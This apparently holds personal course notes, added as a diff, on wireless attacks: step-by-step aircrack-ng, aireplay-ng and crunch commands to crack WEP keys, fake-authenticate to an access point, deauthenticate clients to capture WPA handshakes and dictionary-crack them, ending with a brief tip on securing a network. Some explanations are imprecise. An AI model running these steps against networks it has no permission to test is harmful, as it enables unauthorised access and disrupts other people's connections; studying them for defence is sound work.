@@ -1,0 +1,193 @@
+
+
+	!!! WIRELESS ATTACKS !!!
+
+--------------------------------------------------------------------
+
+54. WEP Settings
+***
+
+1. There are two three types of encryption
+2. WEP ( but very insecure ) and WPA/WPA2
+
+3. So We encrypt the packets that is being transmitted from Client to router , b/w client and server.
+4. Router knows the password of the connected device
+5. But if we dont know the password we have to break that encryption
+
+6. If you want to go to your administrator account of your router device get the IP, username , password and if you dont have that ask your ISP ( Internet Service Provider ) and go to the administrator dashboard
+
+7. In that administration account we can change the Encryption to WEP or WPA2 or WPA3
+
+---------------------------------------------------------------
+
+55. WEP Encryption Logic
+***
+
+1. If we have a router device at home and we have connected our mobile to that network
+
+2. Suppose if we search google.com we send request from our mobile and the router sends the request to the google's server and the server responds to the router and the router responds to us
+
+3. Also if the router has a password to connect and if we know that password we will be able to connect our device to that network
+
+4. Also the packets( request and response ) transmitted is encrypted with KEYS(Password) and IV ( INITIALIZATION VECTORS )
+
+5. Password(Key) + IV = encrypted packets
+
+6. Key or IV is enough to decrypt the packet
+
+7. We can gather IV using $ airodump-ng
+
+8. IV is 24 bits in size.
+
+9. Since we have a repeated pattern over here by using statistical analysis and tool called AIRCRACK-NG ( can understand IV and it can combine IVs and build the password )
+
+10. NOTE!!! : WE NEED 5000 to 20,000 IVs to crack password
+
+---------------------------------------------------------------------
+
+56. Breaking WEP encryption ( With assumption of network traffic )
+***
+
+1. Make sure wifi adapter is on
+
+2. $ iwconfig - Managed Mode initially
+
+3. $ ifconfig - Packets transmitted is 0 in wlan0 initially
+
+4. $ airmon-ng start wlan0 ( To go monitor mode )
+
+5. $ airodump-ng wlan0mon ( Note the BSSID ESSID and other details by)
+
+6. $ airodump-ng --bssid [BSSID] --channel [CH] --write filename.cap wlan0mon ( View that particular device/router and find the traffic and the data packets transmitted )
+
+   The data section is more because lots of packets are being transmitted to the other connected devices
+____________________________________________________________________
+NOTE !!! : Extension of the file is very much important like .cap , .csv , .kismet.csv , .kismet.netxml , .log.csv
+_____________________________________________________________________
+
+7. $ aircrack-ng filename.cap
+{ You can see ASCII ( password ) and set of numbers like [ 61:31:62:32:63 ] } this is the key
+
+8. You can remove the colons and the key is ready as 6131623263 as hexadecimal representation
+
+---------------------------------------------------------------------
+
+57. Fake Authentication ( low devices connected to the router )
+***
+
+1. It is like faking that we are connected to that network but actually we are not
+
+2. COMMANDS : SIMILAR UPTO monitor mode conversion to arcrack-ng filename.cap
+
+3. aireplay-ng --[fakeauth or arpreplay] 0 -b [ our BSSID ] -h [OUR MAC ADDRESS] wlan0mon
+   # --fakeauth - Fake authentication module
+   # --arpreplay - To send ARP( ADDRESS RESOLUTION PROTOCOL ) REQUEST as well ( But we cannot generate traffic )
+   # 0 - number of packets ( it can be upto 10 )
+   # -b stands for Access point (i.e) BSSID
+   # -h for MAC address
+
+4. To find MAC address : $ ifconfig (or)
+      	       	       	 $ ip add
+			 
+5. NOW YOUR DEVICE HAS BEEN ADDED TO THE STATION and THE FAKE AUTHENTICATION IS DONE !!!
+
+6. $ aircrack-ng filename.cap
+   # Thus we got the ASCII(key) and the set of values for the password in colon like 61:32:62:43:43:42
+   
+7. # Now come out of monitor mode
+   $ airmon-ng stop wlan0mon
+
+8. $ iwconfig
+9. $ service NetworkManager restart
+10. It is in the manage mode
+    # Now connect to the network manually using that gathered password
+
+---------------------------------------------------------------------
+
+58. WPA & WPA2
+***
+
+1. Check whether the encryption is in WPA or WPA2 and it doesnt contain IVs
+
+2. In WPA we still have some keys in order to encrypt the packets HANDSHAKE , WORDLIST
+
+3. When a device connected to a router it sends four packes of handshake ( four way handshake ) 
+
+4. What basically we are going to do is that we will be giving some ombination of passwords and the HANDSHAKE says whether the password is correct or not
+
+5. WORDLIST is a txt file that contains combination of passwords
+
+6. $ airmon-ng start wlan0
+
+7. $ airodump-ng wlan0mon
+
+---------------------------------------------------------------------
+
+59. Capturing Handshake
+***
+
+1. airodump-ng --bssid [BSSID] --channel [CH] --write handshake.cap wlo1
+
+2. You can see the handshake on the top of the table
+
+3. If sometimes there is no device connected to the router's network we can use our own deauthentication attack so that you can capture the handshake
+
+4. $ aireplay-ng --deauth 5 -a [BSSID] -c [STATION] wlan0mon
+
+5. With in a seconds the router's network got authenticated and deauthenticated and we have the handshake. If this doesnt work run it again it will work
+
+6. Creating the Wordlist file
+   	    |
+	    V
+
+---------------------------------------------------------------------
+
+60. WPA Cracking
+***
+
+1. $ sudo apt install crunch
+
+2. $ crunch 5 6 123abc -o filename.txt
+
+   # 5,6 is minimum and maximum character
+   # 123abc - is the number and character we are going to use in that combination
+   # -o => output
+   # filename.txt is the WordList
+
+3. aircrack-ng handshake_filename.cap -w filename.txt
+   # It starts to crack the password and it goes for upto 10 to 30 minutes depending upon the complexity of the password
+
+   # If this password cracking goes wrong the problem must be in the HANDSHAKE FILE
+
+---------------------------------------------------------------------
+
+61. WordList alternative
+***
+
+1. If wordlist doesnt work at all you can go with
+
+2. GPUHASH.ME ( Like using the wordlist of commonly used passwords in the world )
+
+3. git clone https://github.com/sanjaykumardk/turkce-wordlist.git
+
+4. It contain a file called fasstrack.txt and use it as a wordlist
+
+5. $ aircrack-ng handshake_file.cap -w fasstrack.txt
+
+6. You can also find whether your password is present inside it or not with
+   $ cat filename.txt | grep password
+
+----------------------------------------------------------------------
+
+62. More Secure Network
+***
+
+Ensure your Password is trickier and the encryption is WPA
+
+1. In WLAN WPS , WPS configuration - WPS by push button ( PBC ) is fine
+2. But not by client PIN
+
+----------------------------------------------------------------------
+
+
+
